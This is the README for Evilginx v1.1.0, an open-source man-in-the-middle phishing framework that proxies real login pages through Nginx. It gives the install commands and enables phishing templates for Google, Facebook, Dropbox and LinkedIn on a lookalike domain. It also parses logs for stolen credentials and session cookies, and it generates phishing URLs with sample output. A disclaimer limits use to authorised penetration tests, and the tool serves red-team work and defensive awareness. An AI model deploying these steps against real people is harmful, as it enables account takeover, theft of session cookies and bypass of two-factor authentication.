## Evilginx v.1.1.0

![Evilginx](/img/evilginx-title.png?raw=true "Evilginx")

**THIS VERSION IS OBSOLETE. PLEASE USE THE LATEST VERSION!**

**EVILGINX 2: https://github.com/kgretzky/evilginx2**

Evilginx is a man-in-the-middle attack framework used for phishing credentials and session cookies of any web service. It's core runs on Nginx HTTP server, which utilizes `proxy_pass` and `sub_filter` to proxy and modify HTTP content, while intercepting traffic between client and server.

You can learn how it works and how to install everything yourself on my blog:

First post slightly outdated now: [Evilginx - Advanced Phishing With Two-factor Authentication Bypass](https://breakdev.org/evilginx-advanced-phishing-with-two-factor-authentication-bypass/)

Evilginx 1.0 Update: [Evilginx 1.0 Update - Up Your Game in 2FA Phishing](https://breakdev.org/evilginx-1-0-update-up-your-game-in-2fa-phishing)

Evilginx 1.1 Update: [Evilginx 1.1 Update](https://breakdev.org/evilginx-1-1-release/)

#### Disclaimer

I am aware that Evilginx can be used for very nefarious purposes. This work is merely a demonstration of what adept attackers can do. It is the defender's responsibility to take such attacks into consideration, when setting up defenses, and find ways to protect against this phishing method.
Evilginx should be used only in legitimate penetration testing assignments with written permission from to-be-phished parties.

#### Contributors Hall of Fame

[@poweroftrue](https://github.com/poweroftrue)

#### Installation

Evilginx provides an installation script `install.sh` that takes care of installing the whole package on any Debian wheezy/jessie machine, in fire and forget manner.

```
git clone https://github.com/kgretzky/evilginx
cd evilginx
chmod 700 install.sh
./install.sh
```

#### Usage

```
            _ _       _            
           (_) |     (_)           
  _____   ___| | __ _ _ _ __ __  __
 / _ \ \ / / | |/ _` | | '_ \\ \/ /
|  __/\ V /| | | (_| | | | | |>  < 
 \___| \_/ |_|_|\__, |_|_| |_/_/\_\
                 __/ |             
 by @mrgretzky  |___/          v1.0

usage: evilginx.py [-h] {setup,parse,genurl} ...

positional arguments:
  {setup,parse,genurl}
    setup               Configure Evilginx.
    parse               Parse log file(s).
    genurl              Generate phishing URL.

optional arguments:
  -h, --help            show this help message and exit
```

###### Setup

Enable or disable site configurations for use with Nginx server, using supplied Evilginx templates from `sites` directory.

```
usage: evilginx.py setup [-h] [-d DOMAIN] [-y]
                         (-l | --enable ENABLE | --disable DISABLE)

optional arguments:
  -h, --help            show this help message and exit
  -d DOMAIN, --domain DOMAIN
                        Your phishing domain.
  -y                    Answer all questions with 'Yes'.
  -l, --list            List available supported apps.
  --enable ENABLE       Enable following site by name.
  --disable DISABLE     Disable following site by name.
```

List available site configuration templates:
```
python evilginx.py setup -l

Listing available supported sites:

 - dropbox (/root/evilginx/sites/dropbox/config)
   subdomains: www
 - google (/root/evilginx/sites/google/config)
   subdomains: accounts, ssl
 - facebook (/root/evilginx/sites/facebook/config)
   subdomains: www, m
 - linkedin (/root/evilginx/sites/linkedin/config)
   subdomains: www
```

Enable google phishing site with preregistered phishing domain `not-really-google.com`:
```
python evilginx.py setup --enable google -d not-really-google.com
```

Disable facebook phishing site:
```
python evilginx.py setup --disable facebook
```

###### Parse

Parse Nginx logs to extract intercepted login credentials and session cookies. Logs, by default, are saved in `logs` directory, where `evilginx.py` script resides.
This can be done automatically after you enable auto-parsing in the **Setup** phase.

```
usage: evilginx.py parse [-h] -s SITE [--debug]

optional arguments:
  -h, --help            show this help message and exit
  -s SITE, --site SITE  Name of site to parse logs for ('all' to parse logs
                        for all sites).
  --debug               Does not truncate log file after parsing.
```

Parse logs only for google site:
```
python evilginx.py parse -s google
```

Parse logs for all available sites:
```
python evilginx.py parse -s all
```

###### Generate URL

Generate phishing URLs that you can use in your Red Team Assessments.

```
usage: evilginx.py genurl [-h] -s SITE -r REDIRECT

optional arguments:
  -h, --help            show this help message and exit
  -s SITE, --site SITE  Name of site to generate link for.
  -r REDIRECT, --redirect REDIRECT
                        Redirect user to this URL after successful sign-in.
```

Generate google phishing URL that will redirect victim to rick'roll video on successful login:
```
python evilginx.py genurl -s google -r https://www.youtube.com/watch?v=dQw4w9WgXcQ

Generated following phishing URLs:

 : https://accounts.not-really-google.com/ServiceLogin?rc=0aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g_dj1kUXc0dzlXZ1hjUQ
 : https://accounts.not-really-google.com/signin/v2/identifier?rc=0aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g_dj1kUXc0dzlXZ1hjUQ
```
